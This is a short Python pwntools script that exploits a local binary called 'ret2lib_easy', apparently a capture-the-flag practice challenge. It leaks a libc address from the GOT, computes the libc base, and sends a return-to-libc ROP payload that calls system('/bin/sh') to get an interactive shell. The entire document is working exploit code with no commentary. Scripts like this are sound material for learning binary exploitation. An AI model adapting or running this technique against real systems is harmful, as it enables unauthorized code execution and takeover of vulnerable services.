from pwn import *

p = process('./ret2lib_easy')
elf = ELF('ret2lib_easy')
libc = elf.libc

__libc_start_main = elf.got['__libc_start_main']
p.sendafter(':', str(__libc_start_main))
p.recvuntil(': ')
__libc_start_main = int(p.recvuntil('\n').strip().decode(), 16)
base = __libc_start_main - libc.symbols['__libc_start_main']
success('libc base = 0x%x', base)
system = base + libc.symbols['system']
ret = 0x0000000000400571
sh = next(libc.search(b'/bin/sh')) + base
pop_rdi = 0x00000000004008c3
payload = p64(sh) + p64(ret) + p64(system) +b'a'*32 + p64(pop_rdi)
p.sendafter(':', payload)

p.interactive()
